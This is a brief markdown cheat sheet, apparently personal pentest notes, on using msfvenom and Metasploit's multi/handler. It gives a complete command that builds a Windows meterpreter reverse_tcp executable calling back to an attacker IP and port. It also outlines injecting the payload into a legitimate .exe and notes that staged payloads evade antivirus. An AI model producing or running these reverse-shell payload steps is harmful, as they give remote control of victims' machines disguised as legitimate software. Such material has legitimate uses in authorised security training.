# Generating Payloads with MSF Venom

1. Generate Payload
2. Inject Payload into legitimate .exe
3. Payload is executed, we need to be ready with a listener

## MSFVenom
Replacement for MSFplayoad and MSF encode
 
 **Payloads** -- ```msfvenom --list payloads```
 - Stage Payloads - Sent in stages to avoid Antivirus
 - Non-Staged Payload - Sent all at once

**Generating a payload**  
```msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.50.64 LPORT=1234 -f exe > /home/secops/Desktop/payloadx86.exe```  
-a -- architecture - OS type  
-p -- payload you would like to use  
-Lhost -- Your IP you want to connect back to  
-LPORT -- Port you want to connect back to  
-f -- File extension type  
">" -- output to

File outputs available -- ```msfvenom --list formats```

Using Multi-Handler to catch connection  
- Module: Multi/handler
- ```set payload (enter your payload option that you generated from MSFvenom)```
- Set options in module (LHOST/LPORT)
- Run
